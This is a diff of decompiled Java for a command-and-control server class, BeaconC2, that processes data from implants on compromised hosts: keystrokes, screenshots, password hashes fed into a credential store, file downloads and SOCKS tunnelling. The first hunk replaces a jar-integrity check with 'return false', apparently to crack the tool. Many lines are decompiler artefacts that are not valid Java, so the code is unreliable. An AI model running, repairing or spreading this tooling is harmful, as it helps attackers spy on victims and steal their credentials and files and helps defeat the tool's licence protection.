@@ -21,7 +21,6 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.IOException;
-import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Iterator;
@@ -31,8 +30,6 @@ import java.util.List;
 import java.util.Map;
 import java.util.Set;
 import java.util.Map.Entry;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipFile;
 import parser.DcSyncCredentials;
 import parser.MimikatzCredentials;
 import parser.MimikatzDcSyncCSV;
@@ -141,66 +138,7 @@ public class BeaconC2 {
    }
 
    protected boolean isPaddingRequired() {
-      boolean var1 = false;
-      long[] var2 = new long[]{1661186542L, 1309838793L};
-      long[] var3 = new long[]{2976461356L, 1209347707L, 2015989942L};
-      long[] var4 = new long[]{2353841112L, 4251026342L, 1671846355L};
-      long[] var5 = new long[]{1056789379L, 895661977L, 2460238802L};
-      long[] var6 = new long[]{3790884950L};
-      long[] var7 = new long[]{3881376138L, 2625235187L};
-      ZipFile var8 = null;
-
-      try {
-         try {
-            var8 = new ZipFile(this.appd);
-         } catch (IOException var15) {
-            return H;
-         }
-
-         Enumeration var9 = var8.entries();
-
-         while(true) {
-            while(true) {
-               ZipEntry var10;
-               do {
-                  if (!var9.hasMoreElements()) {
-                     var8.close();
-                     return var1;
-                  }
-
-                  var10 = (ZipEntry)var9.nextElement();
-               } while(var10.isDirectory());
-
-               long var11 = CommonUtils.checksum8(var10.getName());
-               long var13 = (long)var10.getName().length();
-               if (var11 == 75L && var13 == 21L) {
-                  if (!this.A(var10.getCrc(), var2)) {
-                     var1 = true;
-                  }
-               } else if (var11 == 144L && var13 == 20L) {
-                  if (!this.A(var10.getCrc(), var3)) {
-                     var1 = true;
-                  }
-               } else if (var11 == 62L && var13 == 26L) {
-                  if (!this.A(var10.getCrc(), var4)) {
-                     var1 = true;
-                  }
-               } else if (var11 == 224L && var13 == 23L) {
-                  if (!this.A(var10.getCrc(), var5)) {
-                     var1 = true;
-                  }
-               } else if (var11 == 110L && var13 == 23L) {
-                  if (!this.A(var10.getCrc(), var6)) {
-                     var1 = true;
-                  }
-               } else if (var11 == 221L && var13 == 28L && !this.A(var10.getCrc(), var7)) {
-                  var1 = true;
-               }
-            }
-         }
-      } catch (Throwable var16) {
-         return var1;
-      }
+      return false;
    }
 
    protected final boolean isPaddingSupported() {
@@ -244,7 +182,7 @@ public class BeaconC2 {
             Iterator var9 = this.pipes.children(var1).iterator();
 
             while(var9.hasNext()) {
-               String var10 = var9.next() + "";
+               String var10 = ((Class)var9.next()).makeConcatWithConstants<invokedynamic>(var9.next());
                if (var6 < var2 && this.getSymmetricCrypto().isReady(var10)) {
                   byte[] var11 = this.dump(var10, var2 - var6, var3 - var6, var4);
                   CommandBuilder var12;
@@ -411,15 +349,19 @@ public class BeaconC2 {
       boolean var7 = this.pipes.isChild(var1, var2);
       this.pipes.deregister(var1, var2);
       if (var7) {
-         this.getCheckinListener().output(BeaconOutput.Error(var1, "lost link to child " + CommonUtils.session(var2) + ": " + var6));
-         this.getCheckinListener().output(BeaconOutput.Error(var2, "lost link to parent " + CommonUtils.session(var1) + ": " + var5));
+         CheckinListener var10000 = this.getCheckinListener();
+         String var10002 = CommonUtils.session(var2);
+         var10000.output(BeaconOutput.Error(var1, "lost link to child " + var10002 + ": " + var6));
+         var10000 = this.getCheckinListener();
+         var10002 = CommonUtils.session(var1);
+         var10000.output(BeaconOutput.Error(var2, "lost link to parent " + var10002 + ": " + var5));
       }
 
       Iterator var8 = this.pipes.children(var2).iterator();
       this.pipes.clear(var2);
 
       while(var8.hasNext()) {
-         this.dead_pipe(var2, var8.next() + "");
+         this.dead_pipe(var2, ((Class)var8.next()).makeConcatWithConstants<invokedynamic>(var8.next()));
       }
 
    }
@@ -428,7 +370,7 @@ public class BeaconC2 {
       Iterator var3 = var2.iterator();
 
       while(var3.hasNext()) {
-         String var4 = var3.next() + "";
+         String var4 = ((Class)var3.next()).makeConcatWithConstants<invokedynamic>(var3.next());
          if (this.pipes.isChild(var1, var4)) {
             this.task_to_unlink(var1, var4);
          }
@@ -518,348 +460,358 @@ public class BeaconC2 {
 
    public void process_beacon_callback_decrypted(String var1, byte[] var2) {
       byte var3 = -1;
-      if (var2.length != 0) {
-         if (AssertUtils.TestIsNumber(var1)) {
-            if (AssertUtils.TestNotNull(this.getCheckinListener().resolve(var1 + ""), "process output for beacon session")) {
-               try {
-                  DataInputStream var4 = new DataInputStream(new ByteArrayInputStream(var2));
-                  int var16 = var4.readInt();
-                  String var5;
-                  if (var16 == 0) {
-                     var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                     this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
-                     this.runParsers(var5, var1, var16);
-                  } else if (var16 == 30) {
-                     var5 = this.getCharsets().processOEM(var1, CommonUtils.readAll(var4));
-                     this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
-                     this.runParsers(var5, var1, var16);
-                  } else if (var16 == 32) {
-                     var5 = CommonUtils.bString(CommonUtils.readAll(var4), "UTF-8");
-                     this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
-                     this.runParsers(var5, var1, var16);
+      if (var2.length != 0 && AssertUtils.TestIsNumber(var1) && AssertUtils.TestNotNull(this.getCheckinListener().resolve(var1.makeConcatWithConstants<invokedynamic>(var1)), "process output for beacon session")) {
+         try {
+            DataInputStream var4 = new DataInputStream(new ByteArrayInputStream(var2));
+            int var16 = var4.readInt();
+            String var5;
+            if (var16 == 0) {
+               var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+               this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
+               this.runParsers(var5, var1, var16);
+            } else if (var16 == 30) {
+               var5 = this.getCharsets().processOEM(var1, CommonUtils.readAll(var4));
+               this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
+               this.runParsers(var5, var1, var16);
+            } else if (var16 == 32) {
+               var5 = CommonUtils.bString(CommonUtils.readAll(var4), "UTF-8");
+               this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
+               this.runParsers(var5, var1, var16);
+            } else {
+               DataParser var6;
+               String var7;
+               int var8;
+               String var9;
+               String var10;
+               BeaconEntry var11;
+               byte[] var17;
+               if (var16 == 1) {
+                  var17 = CommonUtils.readAll(var4);
+                  var6 = new DataParser(var17);
+                  var6.little();
+                  if (this.C) {
+                     this.A(var1, var17, var6);
+                     var6.reset();
+                  }
+
+                  var7 = this.getCharsets().process(var1, var6.readCountedBytes());
+                  var8 = var6.readInt();
+                  var9 = this.getCharsets().process(var1, var6.readCountedBytes());
+                  var10 = this.getCharsets().process(var1, var6.readCountedBytes());
+                  var11 = this.getCheckinListener().resolve(var1.makeConcatWithConstants<invokedynamic>(var1));
+                  if (var11 == null) {
+                     return;
+                  }
+
+                  if (var9.length() > 0) {
+                     this.getCheckinListener().output(BeaconOutput.Output(var1, "received keystrokes from " + var9 + " by " + var10));
+                     this.getResources().archive(BeaconOutput.Activity(var1, "keystrokes from " + var9 + " by " + var10));
                   } else {
-                     DataParser var6;
-                     String var7;
-                     int var8;
-                     String var9;
-                     String var10;
-                     BeaconEntry var11;
-                     byte[] var17;
-                     if (var16 == 1) {
-                        var17 = CommonUtils.readAll(var4);
-                        var6 = new DataParser(var17);
-                        var6.little();
-                        if (this.C) {
-                           this.A(var1, var17, var6);
-                           var6.reset();
-                        }
+                     this.getCheckinListener().output(BeaconOutput.Output(var1, "received keystrokes from " + var10));
+                     this.getResources().archive(BeaconOutput.Activity(var1, "keystrokes from " + var10));
+                  }
 
-                        var7 = this.getCharsets().process(var1, var6.readCountedBytes());
-                        var8 = var6.readInt();
-                        var9 = this.getCharsets().process(var1, var6.readCountedBytes());
-                        var10 = this.getCharsets().process(var1, var6.readCountedBytes());
-                        var11 = this.getCheckinListener().resolve(var1 + "");
-                        if (var11 == null) {
-                           return;
-                        }
+                  Keystrokes var12 = new Keystrokes(var1, var7, var10, var11.getComputer(), var8, var9);
+                  this.getCheckinListener().keystrokes(var12);
+               } else if (var16 == 3) {
+                  var17 = CommonUtils.readAll(var4);
+                  var6 = new DataParser(var17);
+                  var6.little();
+                  if (this.G) {
+                     this.B(var1, var17, var6);
+                     var6.reset();
+                  }
 
-                        if (var9.length() > 0) {
-                           this.getCheckinListener().output(BeaconOutput.Output(var1, "received keystrokes from " + var9 + " by " + var10));
-                           this.getResources().archive(BeaconOutput.Activity(var1, "keystrokes from " + var9 + " by " + var10));
+                  byte[] var21 = var6.readCountedBytes();
+                  var8 = var6.readInt();
+                  var9 = this.getCharsets().process(var1, var6.readCountedBytes());
+                  var10 = this.getCharsets().process(var1, var6.readCountedBytes());
+                  if (var21.length == 0) {
+                     this.getCheckinListener().output(BeaconOutput.Error(var1, "screenshot from desktop " + var8 + " is empty"));
+                     return;
+                  }
+
+                  var11 = this.getCheckinListener().resolve(var1.makeConcatWithConstants<invokedynamic>(var1));
+                  if (var11 == null) {
+                     return;
+                  }
+
+                  Screenshot var37 = new Screenshot(var1, var21, var10, var11.getComputer(), var8, var9);
+                  this.getCheckinListener().screenshot(var37);
+                  if (var9.length() > 0) {
+                     this.getCheckinListener().output(BeaconOutput.OutputB(var1, "received screenshot of " + var9 + " from " + var10 + " (" + CommonUtils.formatSize((long)var21.length) + ")"));
+                     this.getResources().archive(BeaconOutput.Activity(var1, "screenshot of " + var9 + " from " + var10));
+                  } else {
+                     this.getCheckinListener().output(BeaconOutput.OutputB(var1, "received screenshot from " + var10 + " (" + CommonUtils.formatSize((long)var21.length) + ")"));
+                     this.getResources().archive(BeaconOutput.Activity(var1, "screenshot from " + var10));
+                  }
+
+                  this.getResources().process(new ScreenshotEvent(var37));
+               } else {
+                  int var18;
+                  int var19;
+                  BeaconEntry var31;
+                  BeaconEntry var20;
+                  if (var16 == 10) {
+                     var18 = var4.readInt();
+                     var19 = var4.readInt();
+                     var7 = CommonUtils.bString(CommonUtils.readAll(var4));
+                     var20 = this.getCheckinListener().resolve(var1.makeConcatWithConstants<invokedynamic>(var1));
+                     var31 = this.process_beacon_metadata((ScListener)null, var20.getInternal() + " ⚯⚯", CommonUtils.toBytes(var7), var1, var19);
+                     if (var31 != null) {
+                        this.pipes.register(var1.makeConcatWithConstants<invokedynamic>(var1), var18.makeConcatWithConstants<invokedynamic>(var18));
+                        CheckinListener var10000;
+                        String var10002;
+                        Resources var31;
+                        if (var31.getInternal() == null) {
+                           this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(var18)));
+                           this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(var18)));
                         } else {
-                           this.getCheckinListener().output(BeaconOutput.Output(var1, "received keystrokes from " + var10));
-                           this.getResources().archive(BeaconOutput.Activity(var1, "keystrokes from " + var10));
+                           var10000 = this.getCheckinListener();
+                           var10002 = CommonUtils.session(var18);
+                           var10000.output(BeaconOutput.Output(var1, "established link to child " + var10002 + ": " + var31.getInternal()));
+                           var31 = this.getResources();
+                           var10002 = CommonUtils.session(var18);
+                           var31.archive(BeaconOutput.Activity(var1, "established link to child " + var10002 + ": " + var31.getComputer()));
                         }
 
-                        Keystrokes var12 = new Keystrokes(var1, var7, var10, var11.getComputer(), var8, var9);
-                        this.getCheckinListener().keystrokes(var12);
-                     } else if (var16 == 3) {
-                        var17 = CommonUtils.readAll(var4);
-                        var6 = new DataParser(var17);
-                        var6.little();
-                        if (this.G) {
-                           this.B(var1, var17, var6);
-                           var6.reset();
+                        var10000 = this.getCheckinListener();
+                        String var10001 = var31.getId();
+                        var10002 = CommonUtils.session(var1);
+                        var10000.output(BeaconOutput.Output(var10001, "established link to parent " + var10002 + ": " + var20.getInternal()));
+                        var31 = this.getResources();
+                        var10001 = var31.getId();
+                        var10002 = CommonUtils.session(var1);
+                        var31.archive(BeaconOutput.Activity(var10001, "established link to parent " + var10002 + ": " + var20.getComputer()));
+                     }
+                  } else if (var16 == 11) {
+                     var18 = var4.readInt();
+                     var20 = this.getCheckinListener().resolve(var1.makeConcatWithConstants<invokedynamic>(var1));
+                     this.dead_pipe(var20.getId(), var18.makeConcatWithConstants<invokedynamic>(var18));
+                  } else {
+                     byte[] var22;
+                     if (var16 == 12) {
+                        var18 = var4.readInt();
+                        var22 = CommonUtils.readAll(var4);
+                        if (var22.length > 0) {
+                           this.process_beacon_data(var18.makeConcatWithConstants<invokedynamic>(var18), var22);
                         }
 
-                        byte[] var21 = var6.readCountedBytes();
-                        var8 = var6.readInt();
-                        var9 = this.getCharsets().process(var1, var6.readCountedBytes());
-                        var10 = this.getCharsets().process(var1, var6.readCountedBytes());
-                        if (var21.length == 0) {
-                           this.getCheckinListener().output(BeaconOutput.Error(var1, "screenshot from desktop " + var8 + " is empty"));
-                           return;
-                        }
-
-                        var11 = this.getCheckinListener().resolve(var1 + "");
-                        if (var11 == null) {
-                           return;
-                        }
-
-                        Screenshot var37 = new Screenshot(var1, var21, var10, var11.getComputer(), var8, var9);
-                        this.getCheckinListener().screenshot(var37);
-                        if (var9.length() > 0) {
-                           this.getCheckinListener().output(BeaconOutput.OutputB(var1, "received screenshot of " + var9 + " from " + var10 + " (" + CommonUtils.formatSize((long)var21.length) + ")"));
-                           this.getResources().archive(BeaconOutput.Activity(var1, "screenshot of " + var9 + " from " + var10));
-                        } else {
-                           this.getCheckinListener().output(BeaconOutput.OutputB(var1, "received screenshot from " + var10 + " (" + CommonUtils.formatSize((long)var21.length) + ")"));
-                           this.getResources().archive(BeaconOutput.Activity(var1, "screenshot from " + var10));
-                        }
-
-                        this.getResources().process(new ScreenshotEvent(var37));
+                        this.getCheckinListener().update(var18.makeConcatWithConstants<invokedynamic>(var18), System.currentTimeMillis(), (String)null, false);
+                     } else if (var16 == 13) {
+                        var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                        this.getCheckinListener().output(BeaconOutput.Error(var1, var5));
                      } else {
-                        int var18;
-                        int var19;
-                        BeaconEntry var31;
-                        if (var16 == 10) {
+                        String var28;
+                        if (var16 == 31) {
                            var18 = var4.readInt();
                            var19 = var4.readInt();
-                           var7 = CommonUtils.bString(CommonUtils.readAll(var4));
-                           BeaconEntry var26 = this.getCheckinListener().resolve(var1 + "");
-                           var31 = this.process_beacon_metadata((ScListener)null, var26.getInternal() + " ⚯⚯", CommonUtils.toBytes(var7), var1, var19);
-                           if (var31 != null) {
-                              this.pipes.register(var1 + "", var18 + "");
-                              if (var31.getInternal() == null) {
-                                 this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(var18)));
-                                 this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(var18)));
-                              } else {
-                                 this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(var18) + ": " + var31.getInternal()));
-                                 this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(var18) + ": " + var31.getComputer()));
-                              }
-
-                              this.getCheckinListener().output(BeaconOutput.Output(var31.getId(), "established link to parent " + CommonUtils.session(var1) + ": " + var26.getInternal()));
-                              this.getResources().archive(BeaconOutput.Activity(var31.getId(), "established link to parent " + CommonUtils.session(var1) + ": " + var26.getComputer()));
-                           }
+                           int var23 = var4.readInt();
+                           var28 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                           this.getCheckinListener().output(BeaconOutput.Error(var1, BeaconErrors.toString(var18, var19, var23, var28)));
                         } else {
-                           BeaconEntry var20;
-                           if (var16 == 11) {
+                           CommandBuilder var25;
+                           if (var16 == 14) {
                               var18 = var4.readInt();
-                              var20 = this.getCheckinListener().resolve(var1 + "");
-                              this.dead_pipe(var20.getId(), var18 + "");
-                           } else {
-                              byte[] var22;
-                              if (var16 == 12) {
-                                 var18 = var4.readInt();
-                                 var22 = CommonUtils.readAll(var4);
-                                 if (var22.length > 0) {
-                                    this.process_beacon_data(var18 + "", var22);
+                              if (!this.pipes.isChild(var1, var18.makeConcatWithConstants<invokedynamic>(var18))) {
+                                 var25 = new CommandBuilder();
+                                 var25.setCommand(24);
+                                 var25.addInteger(var18);
+                                 if (this.data.isNewSession(var1)) {
+                                    this.data.task(var1, var25.build());
+                                    this.data.virgin(var1);
+                                 } else {
+                                    this.data.task(var1, var25.build());
                                  }
 
-                                 this.getCheckinListener().update(var18 + "", System.currentTimeMillis(), (String)null, false);
-                              } else if (var16 == 13) {
-                                 var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                 this.getCheckinListener().output(BeaconOutput.Error(var1, var5));
+                                 this.pipes.register(var1.makeConcatWithConstants<invokedynamic>(var1), var18.makeConcatWithConstants<invokedynamic>(var18));
+                              }
+                           } else if (var16 == 18) {
+                              var18 = var4.readInt();
+                              this.getCheckinListener().output(BeaconOutput.Error(var1, "Task Rejected! Did your clock change? Wait " + var18 + " seconds"));
+                           } else if (var16 == 28) {
+                              var18 = var4.readInt();
+                              var22 = CommonUtils.readAll(var4);
+                              this.parts.start(var1, var18);
+                              this.parts.put(var1, var22);
+                           } else if (var16 == 29) {
+                              var17 = CommonUtils.readAll(var4);
+                              this.parts.put(var1, var17);
+                              if (this.parts.isReady(var1)) {
+                                 var22 = this.parts.data(var1);
+                                 this.process_beacon_callback_decrypted(var1, var22);
+                              }
+                           } else {
+                              if (this.data.isNewSession(var1)) {
+                                 this.getCheckinListener().output(BeaconOutput.Error(var1, "Dropped responses from session. Didn't expect " + var16 + " prior to first task."));
+                                 CommonUtils.print_error("Dropped responses from session " + var1 + " [type: " + var16 + "] (no interaction with this session yet)");
+                                 return;
+                              }
+
+                              if (var16 == 2) {
+                                 var18 = var4.readInt();
+                                 long var29 = CommonUtils.toUnsignedInt(var4.readInt());
+                                 var28 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                 var31 = this.getCheckinListener().resolve(var1.makeConcatWithConstants<invokedynamic>(var1));
+                                 this.getCheckinListener().output(BeaconOutput.OutputB(var1, "started download of " + var28 + " (" + var29 + " bytes)"));
+                                 this.getResources().archive(BeaconOutput.Activity(var1, "started download of " + var28 + " (" + var29 + " bytes)"));
+                                 this.downloads.start(var1, var18, var31.getInternal(), var28, var29);
+                              } else if (var16 == 4) {
+                                 var18 = var4.readInt();
+                                 this.socks.die(var1, var18);
+                              } else if (var16 == 5) {
+                                 var18 = var4.readInt();
+                                 var22 = CommonUtils.readAll(var4);
+                                 this.socks.write(var1, var18, var22);
+                              } else if (var16 == 6) {
+                                 var18 = var4.readInt();
+                                 this.socks.resume(var1, var18);
+                              } else if (var16 == 7) {
+                                 var18 = var4.readUnsignedShort();
+                                 if (this.isWhitelistedPort(var1, var18)) {
+                                    this.socks.portfwd(var1, var18, "127.0.0.1", var18);
+                                 } else {
+                                    CommonUtils.print_error("port " + var18 + " for beacon " + var1 + " is not in our whitelist of allowed-to-open ports");
+                                 }
+                              } else if (var16 == 8) {
+                                 var18 = var4.readInt();
+                                 var22 = CommonUtils.readAll(var4);
+                                 if (this.downloads.exists(var1.makeConcatWithConstants<invokedynamic>(var1), var18)) {
+                                    this.downloads.write(var1, var18, var22);
+                                 } else {
+                                    CommonUtils.print_error("Received unknown download id " + var18 + " - canceling download");
+                                    var25 = new CommandBuilder();
+                                    var25.setCommand(19);
+                                    var25.addInteger(var18);
+                                    this.data.task(var1, var25.build());
+                                 }
                               } else {
-                                 String var28;
-                                 if (var16 == 31) {
+                                 String var34;
+                                 if (var16 == 9) {
                                     var18 = var4.readInt();
-                                    var19 = var4.readInt();
-                                    int var23 = var4.readInt();
-                                    var28 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                    this.getCheckinListener().output(BeaconOutput.Error(var1, BeaconErrors.toString(var18, var19, var23, var28)));
-                                 } else if (var16 == 14) {
-                                    var18 = var4.readInt();
-                                    if (!this.pipes.isChild(var1, var18 + "")) {
-                                       CommandBuilder var24 = new CommandBuilder();
-                                       var24.setCommand(24);
-                                       var24.addInteger(var18);
-                                       if (this.data.isNewSession(var1)) {
-                                          this.data.task(var1, var24.build());
-                                          this.data.virgin(var1);
+                                    var34 = this.downloads.getName(var1, var18);
+                                    Download var27 = this.downloads.getDownload(var1, var18);
+                                    boolean var32 = this.downloads.isComplete(var1, var18);
+                                    if (this.downloads.exists(var1.makeConcatWithConstants<invokedynamic>(var1), var18)) {
+                                       this.downloads.close(var1, var18);
+                                       if (var32) {
+                                          this.getCheckinListener().output(BeaconOutput.OutputB(var1, "download of " + var34 + " is complete"));
+                                          this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var34 + " is complete"));
                                        } else {
-                                          this.data.task(var1, var24.build());
+                                          this.getCheckinListener().output(BeaconOutput.Error(var1, "download of " + var34 + " closed. [Incomplete]"));
+                                          this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var34 + " closed. [Incomplete]"));
                                        }
 
-                                       this.pipes.register(var1 + "", var18 + "");
+                                       this.getCheckinListener().download(var27);
+                                    } else {
+                                       var9 = "download [id: " + var18 + "] closed: Missed start message/metadata.";
+                                       this.getCheckinListener().output(BeaconOutput.Error(var1, var9));
+                                       this.getResources().archive(BeaconOutput.Activity(var1, var9));
                                     }
-                                 } else if (var16 == 18) {
-                                    var18 = var4.readInt();
-                                    this.getCheckinListener().output(BeaconOutput.Error(var1, "Task Rejected! Did your clock change? Wait " + var18 + " seconds"));
-                                 } else if (var16 == 28) {
-                                    var18 = var4.readInt();
-                                    var22 = CommonUtils.readAll(var4);
-                                    this.parts.start(var1, var18);
-                                    this.parts.put(var1, var22);
-                                 } else if (var16 == 29) {
-                                    var17 = CommonUtils.readAll(var4);
-                                    this.parts.put(var1, var17);
-                                    if (this.parts.isReady(var1)) {
-                                       var22 = this.parts.data(var1);
-                                       this.process_beacon_callback_decrypted(var1, var22);
-                                    }
-                                 } else {
-                                    if (this.data.isNewSession(var1)) {
-                                       this.getCheckinListener().output(BeaconOutput.Error(var1, "Dropped responses from session. Didn't expect " + var16 + " prior to first task."));
-                                       CommonUtils.print_error("Dropped responses from session " + var1 + " [type: " + var16 + "] (no interaction with this session yet)");
+                                 } else if (var16 == 15) {
+                                    var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "Impersonated " + var5));
+                                 } else if (var16 == 16) {
+                                    var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                    this.getCheckinListener().output(BeaconOutput.OutputB(var1, "You are " + var5));
+                                 } else if (var16 == 17) {
+                                    var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                    this.getCheckinListener().output(BeaconOutput.OutputPS(var1, var5));
+                                 } else if (var16 == 19) {
+                                    var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
+                                    this.getCheckinListener().output(BeaconOutput.OutputB(var1, "Current directory is " + var5));
+                                 } else if (var16 == 20) {
+                                    var5 = CommonUtils.bString(CommonUtils.readAll(var4));
+                                    this.getCheckinListener().output(BeaconOutput.OutputJobs(var1, var5));
+                                 } else if (var16 == 21) {
+                                    var5 = CommonUtils.bString(CommonUtils.readAll(var4), "UTF-8");
+                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "received password hashes:\n" + var5));
+                                    this.getResources().archive(BeaconOutput.Activity(var1, "received password hashes"));
+                                    var20 = this.getCheckinListener().resolve(var1);
+                                    if (var20 == null) {
                                        return;
                                     }
 
-                                    if (var16 == 2) {
-                                       var18 = var4.readInt();
-                                       long var29 = CommonUtils.toUnsignedInt(var4.readInt());
-                                       var28 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                       var31 = this.getCheckinListener().resolve(var1 + "");
-                                       this.getCheckinListener().output(BeaconOutput.OutputB(var1, "started download of " + var28 + " (" + var29 + " bytes)"));
-                                       this.getResources().archive(BeaconOutput.Activity(var1, "started download of " + var28 + " (" + var29 + " bytes)"));
-                                       this.downloads.start(var1, var18, var31.getInternal(), var28, var29);
-                                    } else if (var16 == 4) {
-                                       var18 = var4.readInt();
-                                       this.socks.die(var1, var18);
-                                    } else if (var16 == 5) {
-                                       var18 = var4.readInt();
-                                       var22 = CommonUtils.readAll(var4);
-                                       this.socks.write(var1, var18, var22);
-                                    } else if (var16 == 6) {
-                                       var18 = var4.readInt();
-                                       this.socks.resume(var1, var18);
-                                    } else if (var16 == 7) {
-                                       var18 = var4.readUnsignedShort();
-                                       if (this.isWhitelistedPort(var1, var18)) {
-                                          this.socks.portfwd(var1, var18, "127.0.0.1", var18);
-                                       } else {
-                                          CommonUtils.print_error("port " + var18 + " for beacon " + var1 + " is not in our whitelist of allowed-to-open ports");
-                                       }
-                                    } else if (var16 == 8) {
-                                       var18 = var4.readInt();
-                                       var22 = CommonUtils.readAll(var4);
-                                       if (this.downloads.exists(var1 + "", var18)) {
-                                          this.downloads.write(var1, var18, var22);
-                                       } else {
-                                          CommonUtils.print_error("Received unknown download id " + var18 + " - canceling download");
-                                          CommandBuilder var25 = new CommandBuilder();
-                                          var25.setCommand(19);
-                                          var25.addInteger(var18);
-                                          this.data.task(var1, var25.build());
-                                       }
-                                    } else {
-                                       String var34;
-                                       if (var16 == 9) {
-                                          var18 = var4.readInt();
-                                          var34 = this.downloads.getName(var1, var18);
-                                          Download var27 = this.downloads.getDownload(var1, var18);
-                                          boolean var32 = this.downloads.isComplete(var1, var18);
-                                          if (this.downloads.exists(var1 + "", var18)) {
-                                             this.downloads.close(var1, var18);
-                                             if (var32) {
-                                                this.getCheckinListener().output(BeaconOutput.OutputB(var1, "download of " + var34 + " is complete"));
-                                                this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var34 + " is complete"));
-                                             } else {
-                                                this.getCheckinListener().output(BeaconOutput.Error(var1, "download of " + var34 + " closed. [Incomplete]"));
-                                                this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var34 + " closed. [Incomplete]"));
-                                             }
+                                    String[] var30 = var5.split("\n");
 
-                                             this.getCheckinListener().download(var27);
-                                          } else {
-                                             var9 = "download [id: " + var18 + "] closed: Missed start message/metadata.";
-                                             this.getCheckinListener().output(BeaconOutput.Error(var1, var9));
-                                             this.getResources().archive(BeaconOutput.Activity(var1, var9));
-                                          }
-                                       } else if (var16 == 15) {
-                                          var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                          this.getCheckinListener().output(BeaconOutput.Output(var1, "Impersonated " + var5));
-                                       } else if (var16 == 16) {
-                                          var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                          this.getCheckinListener().output(BeaconOutput.OutputB(var1, "You are " + var5));
-                                       } else if (var16 == 17) {
-                                          var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                          this.getCheckinListener().output(BeaconOutput.OutputPS(var1, var5));
-                                       } else if (var16 == 19) {
-                                          var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                          this.getCheckinListener().output(BeaconOutput.OutputB(var1, "Current directory is " + var5));
-                                       } else if (var16 == 20) {
-                                          var5 = CommonUtils.bString(CommonUtils.readAll(var4));
-                                          this.getCheckinListener().output(BeaconOutput.OutputJobs(var1, var5));
-                                       } else if (var16 == 21) {
-                                          var5 = CommonUtils.bString(CommonUtils.readAll(var4), "UTF-8");
-                                          this.getCheckinListener().output(BeaconOutput.Output(var1, "received password hashes:\n" + var5));
-                                          this.getResources().archive(BeaconOutput.Activity(var1, "received password hashes"));
-                                          var20 = this.getCheckinListener().resolve(var1);
-                                          if (var20 == null) {
-                                             return;
-                                          }
-
-                                          String[] var30 = var5.split("\n");
-
-                                          for(var8 = 0; var8 < var30.length; ++var8) {
-                                             RegexParser var36 = new RegexParser(var30[var8]);
-                                             if (var36.matches("(.*?):\\d+:.*?:(.*?):::") && !var36.group(1).endsWith("$")) {
-                                                ServerUtils.addCredential(this.resources, var36.group(1), var36.group(2), var20.getComputer(), "hashdump", var20.getInternal());
-                                             }
-                                          }
-
-                                          this.resources.call("credentials.push");
-                                       } else if (var16 == 22) {
-                                          var18 = var4.readInt();
-                                          var34 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                          var7 = null;
-                                          Integer var35 = new Integer(var18);
-                                          PendingRequest var33;
-                                          synchronized(this) {
-                                             var33 = (PendingRequest)this.pending.remove(var35);
-                                          }
-
-                                          if (var35 < 0) {
-                                             this.process_beacon_callback_default(var35, var1, var34);
-                                          } else if (var33 != null) {
-                                             var33.action(var34);
-                                          } else {
-                                             CommonUtils.print_error("Callback " + var16 + "/" + var18 + " has no pending request");
-                                          }
-                                       } else if (var16 == 23) {
-                                          var18 = var4.readInt();
-                                          var19 = var4.readInt();
-                                          this.socks.accept(var1, var19, var18);
-                                       } else if (var16 == 24) {
-                                          var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                          this.getResources().archive(BeaconOutput.Activity(var1, "received output from net module"));
-                                          this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
-                                          this.runParsers(var5, var1, var16);
-                                       } else if (var16 == 25) {
-                                          var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
-                                          this.getResources().archive(BeaconOutput.Activity(var1, "received output from port scanner"));
-                                          this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
-                                          this.runParsers(var5, var1, var16);
-                                       } else if (var16 == 26) {
-                                          this.getCheckinListener().output(BeaconOutput.Output(var1, CommonUtils.session(var1) + " exit."));
-                                          this.getResources().archive(BeaconOutput.Activity(var1, CommonUtils.session(var1) + " exit."));
-                                          BeaconEntry var38 = this.getCheckinListener().resolve(var1);
-                                          if (var38 != null) {
-                                             var38.die();
-                                          }
-                                       } else if (var16 == 27) {
